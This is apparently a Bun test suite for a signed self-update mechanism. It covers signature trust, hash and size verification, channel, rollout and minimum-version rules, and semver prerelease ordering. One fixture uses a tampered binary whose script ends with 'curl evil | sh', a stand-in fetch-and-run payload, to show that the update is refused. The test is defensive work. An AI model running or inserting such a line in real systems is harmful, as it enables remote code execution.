import { afterEach, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { releasePublicKey, signRelease } from "@doriface/crypto";
import { compareVersions, parseHostManifest } from "./manifest.ts";
import { selfUpdate, SelfUpdateError, type SelfUpdateOptions } from "./self-update.ts";
import { parseChannel } from "../commands/update.ts";

const ORIGIN = "https://get.doriterm.com";
// Any 32 bytes are an Ed25519 seed.
const key = crypto.getRandomValues(new Uint8Array(32));
const otherKey = crypto.getRandomValues(new Uint8Array(32));
const trusted = [releasePublicKey(key)];
const NEW_BINARY = '#!/bin/sh\necho "doriface-host 0.1.17"\n';
const sha = (text: string): string => new Bun.CryptoHasher("sha256").update(text).digest("hex");

const dirs: string[] = [];
afterEach(() => dirs.splice(0).forEach((dir) => rmSync(dir, { recursive: true, force: true })));

interface Release {
  readonly manifest?: Record<string, unknown>;
  readonly signWith?: Uint8Array;
  readonly tamperSignature?: boolean;
  readonly download?: string;
}

function rig(release: Release = {}) {
  const dir = mkdtempSync(join(tmpdir(), "self-update-"));
  dirs.push(dir);
  const binary = join(dir, "doriface-host");
  writeFileSync(binary, "old binary", { mode: 0o755 });
  const manifest = {
    version: "0.1.17",
    channel: "stable",
    rollout: 100,
    minimum: "0.1.10",
    targets: {
      "linux-x64": {
        url: `${ORIGIN}/host/stable/0.1.17/doriface-host-linux-x64`,
        sha256: sha(NEW_BINARY),
        size: NEW_BINARY.length,
      },
    },
    ...release.manifest,
  };
  const body = JSON.stringify(manifest);
  const signed = signRelease(
    new TextEncoder().encode(release.tamperSignature ? `${body} ` : body),
    release.signWith ?? key,
  );
  const files: Record<string, string> = {
    [`${ORIGIN}/host/stable/manifest.json`]: body,
    [`${ORIGIN}/host/stable/manifest.json.sig`]: signed,
    [`${ORIGIN}/host/stable/0.1.17/doriface-host-linux-x64`]: release.download ?? NEW_BINARY,
  };
  const fetched: string[] = [];
  const options: SelfUpdateOptions = {
    channel: "stable",
    currentVersion: "0.1.16",
    binary,
    updaterId: "00000000-0000-4000-8000-000000000000",
    platform: "linux",
    arch: "x64",
    trustedKeys: trusted,
    fetcher: async (url) => {
      fetched.push(url);
      const text = files[url];
      return text === undefined ? new Response("missing", { status: 404 }) : new Response(text);
    },
  };
  const downloaded = () => fetched.some((url) => url.endsWith("doriface-host-linux-x64"));
  const untouched = () => readFileSync(binary, "utf8") === "old binary" && !existsSync(`${binary}.new`);
  return { binary, options, downloaded, untouched };
}

const caughtUpdate = async (promise: Promise<unknown>): Promise<SelfUpdateError> => {
  const error = await promise.then(
    () => undefined,
    (caught: unknown) => caught,
  );
  if (!(error instanceof SelfUpdateError)) throw new Error(`expected a SelfUpdateError, got ${String(error)}`);
  return error;
};
const refusal = async (promise: Promise<unknown>): Promise<string> => (await caughtUpdate(promise)).phase;

/** A response that would stream `chunks` chunks of 64 KiB, counting how many were read. */
function endless(chunks: number) {
  let pulled = 0;
  const body = new ReadableStream<Uint8Array>({
    pull(controller) {
      pulled += 1;
      if (pulled > chunks) controller.close();
      else controller.enqueue(new Uint8Array(64 * 1024).fill(35));
    },
  });
  return { response: new Response(body), pulled: () => pulled };
}

test("a download is read only up to the manifest's size, and the manifest and its signature up to a fixed bound (#1983)", async () => {
  const r = rig();
  const big = endless(4096);
  const fetcher = r.options.fetcher;
  const withBigDownload = async (url: string) =>
    url.endsWith("doriface-host-linux-x64") ? big.response : fetcher === undefined ? new Response(null) : fetcher(url);
  const download = await caughtUpdate(selfUpdate({ ...r.options, fetcher: withBigDownload }));
  expect([download.phase, download.message]).toEqual([
    "verify",
    `the download is larger than the ${NEW_BINARY.length} bytes the manifest names; nothing was replaced`,
  ]);
  expect(big.pulled()).toBeLessThan(4);
  expect(r.untouched()).toBe(true);

  const hugeManifest = endless(4096);
  const withBigManifest = async (url: string) =>
    url.endsWith("manifest.json") ? hugeManifest.response : fetcher === undefined ? new Response(null) : fetcher(url);
  const manifest = await caughtUpdate(selfUpdate({ ...r.options, fetcher: withBigManifest }));
  expect([manifest.phase, manifest.message]).toEqual(["manifest", "the manifest is larger than 65536 bytes"]);
  expect(hugeManifest.pulled()).toBeLessThan(4);
});

test("a signed, newer, rolled-out build is checked, run with --version and renamed over the binary", async () => {
  const r = rig();
  expect(await selfUpdate(r.options)).toEqual({ kind: "updated", version: "0.1.17" });
  expect(readFileSync(r.binary, "utf8")).toBe(NEW_BINARY);
  expect(statSync(r.binary).mode & 0o777).toBe(0o755);
  expect(existsSync(`${r.binary}.new`)).toBe(false);
});

test("a manifest with a bad signature, or one by a key this build does not trust, stops before any download", async () => {
  for (const release of [{ tamperSignature: true }, { signWith: otherKey }]) {
    const r = rig(release);
    // oxlint-disable-next-line no-await-in-loop -- each case has its own rig
    expect(await refusal(selfUpdate(r.options))).toBe("signature");
    expect([r.downloaded(), r.untouched()]).toEqual([false, true]);
  }
  const unsigned = rig();
  expect(await refusal(selfUpdate({ ...unsigned.options, trustedKeys: [] }))).toBe("signature");
});

test("a download whose sha256 does not match the signed manifest replaces nothing", async () => {
  const r = rig({ download: '#!/bin/sh\necho "doriface-host 0.1.17"; curl evil | sh\n' });
  expect(await refusal(selfUpdate(r.options))).toBe("verify");
  expect(r.untouched()).toBe(true);
});

test("a host below the manifest's floor is told to reinstall and downloads nothing", async () => {
  const r = rig();
  expect(await selfUpdate({ ...r.options, currentVersion: "0.1.9" })).toEqual({
    kind: "below-minimum",
    version: "0.1.17",
    minimum: "0.1.10",
  });
  expect([r.downloaded(), r.untouched()]).toEqual([false, true]);
});

test("with rollout 0 every host stays where it is, and nothing older or equal is ever installed", async () => {
  const held = rig({ manifest: { rollout: 0 } });
  expect(await selfUpdate(held.options)).toEqual({ kind: "held", version: "0.1.17", rollout: 0 });
  expect([held.downloaded(), held.untouched()]).toEqual([false, true]);
  const same = rig();
  expect(await selfUpdate({ ...same.options, currentVersion: "0.1.17" })).toEqual({
    kind: "current",
    version: "0.1.17",
  });
  expect(await selfUpdate({ ...same.options, currentVersion: "0.2.0" })).toEqual({ kind: "current", version: "0.2.0" });
  expect(same.downloaded()).toBe(false);
});

test("a build hosted elsewhere, a binary that answers another version, or a malformed manifest replaces nothing", async () => {
  const elsewhere = rig({
    manifest: {
      targets: {
        "linux-x64": { url: "https://example.com/doriface-host", sha256: sha(NEW_BINARY), size: NEW_BINARY.length },
      },
    },
  });
  expect(await refusal(selfUpdate(elsewhere.options))).toBe("manifest");
  const liar = '#!/bin/sh\necho "doriface-host 0.1.16"\n';
  const wrong = rig({
    download: liar,
    manifest: {
      targets: {
        "linux-x64": {
          url: `${ORIGIN}/host/stable/0.1.17/doriface-host-linux-x64`,
          sha256: sha(liar),
          size: liar.length,
        },
      },
    },
  });
  expect(await refusal(selfUpdate(wrong.options))).toBe("check");
  expect(wrong.untouched()).toBe(true);
  const malformed = rig({ manifest: { rollout: 150 } });
  expect(await refusal(selfUpdate(malformed.options))).toBe("manifest");
});

const manifestVersion = (version: string) =>
  parseHostManifest(JSON.stringify({ version, channel: "beta", rollout: 100, targets: {} }))?.version ?? null;

test("a version with a leading zero, which semver forbids, is no manifest version (#1983)", () => {
  const manifest = manifestVersion;
  for (const bad of ["0.1.18-beta.09", "01.1.18", "0.01.18", "0.1.018", "0.1.18-00"])
    expect([bad, manifest(bad)]).toEqual([bad, null]);
  for (const good of ["0.1.18", "0.1.18-beta.9", "0.1.18-beta.10", "0.1.18-rc.0", "0.1.18-0a.1", "10.0.0"])
    expect(manifest(good)).toBe(good);
});

test("prerelease identifiers order by value, so beta.10 follows beta.9 and a beta.9 manifest never replaces beta.10", async () => {
  const ordered = ["0.1.17", "0.1.18-beta.2", "0.1.18-beta.9", "0.1.18-beta.10", "0.1.18-rc.1", "0.1.18", "0.2.0"];
  for (let i = 0; i < ordered.length - 1; i++) {
    const [a = "", b = ""] = [ordered[i], ordered[i + 1]];
    expect([a, b, compareVersions(a, b), compareVersions(b, a)]).toEqual([a, b, -1, 1]);
  }
  const r = rig({ manifest: { version: "0.1.18-beta.9", channel: "beta" } });
  const fetcher = r.options.fetcher;
  const fromBeta = async (url: string) =>
    fetcher === undefined ? new Response(null, { status: 500 }) : fetcher(url.replace("/host/beta/", "/host/stable/"));
  expect(
    await selfUpdate({ ...r.options, channel: "beta", fetcher: fromBeta, currentVersion: "0.1.18-beta.10" }),
  ).toEqual({
    kind: "current",
    version: "0.1.18-beta.10",
  });
  expect(r.downloaded()).toBe(false);
});

test("a signed manifest is taken only on its own channel, and beta also takes stable's", async () => {
  const beta = rig({ manifest: { channel: "beta" } });
  const refused = await caughtUpdate(selfUpdate(beta.options));
  expect([refused.phase, refused.message]).toEqual(["manifest", "the signed manifest is for beta, not stable"]);
  expect([beta.downloaded(), beta.untouched()]).toEqual([false, true]);
  const stableOnBeta = rig();
  const betaFiles = { ...stableOnBeta.options, channel: "beta" as const };
  const fetcher = betaFiles.fetcher;
  const remap = async (url: string) =>
    fetcher === undefined ? new Response(null, { status: 500 }) : fetcher(url.replace("/host/beta/", "/host/stable/"));
  expect(await selfUpdate({ ...betaFiles, fetcher: remap })).toEqual({ kind: "updated", version: "0.1.17" });
  expect(() => parseChannel("nightly", "--auto-update")).toThrow('--auto-update wants stable or beta, got "nightly"');
});
